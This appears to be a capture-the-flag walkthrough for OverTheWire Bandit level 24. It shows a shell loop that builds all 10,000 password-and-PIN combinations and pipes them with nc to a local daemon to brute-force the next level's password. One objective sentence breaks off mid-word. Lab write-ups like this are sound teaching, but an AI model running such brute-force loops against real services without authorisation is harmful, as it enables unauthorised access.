# OverTheWire Bandit (Level 24-25)

# Objectives
  A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each tim
# Command used
    ssh, grep, cat, mkdir, cd, nc

# Step By Step
1. Open the Ubuntu Terminal
2. Type command like this: ssh bandit24@bandit.labs.overthewire.org -p 2220
    # ssh is used to connect to the overthewire server and after @ was the hostlink of overthewire and -p is mean port and the port number of overthewire is 2220
3. The password is password that you get on level 23-24
4. After you in type this "mkdir /tmp/my_brute_24 && cd /tmp/my_brute_24"
5. And then "PASS="<PASSWORD_BANDIT24>"", the PASSWORD_BANDIT24 is the password level 23-24
6. After that type this "for pin in $(seq -w 0000 9999); do
                             echo "$PASS $pin"
                         done > wordlist.txt"
    # it because the pin 4 digit , -w is equal width
7. And then type "cat wordlist.txt | nc localhost 30002 > result.txt"
    # it will read the content of wordlist.txt and then send the content to the localhost 30002 and save in the new file (result.txt)
    # FYI : && is and logic,   || is or logic,  | is make the output of the previous command become the input of the next command
8. After that type this "grep -v "Wrong" result.txt"
    # -v is invert match (look for words other than those requested)

# AND CONGRATS YOU COMPLETE LEVEL 24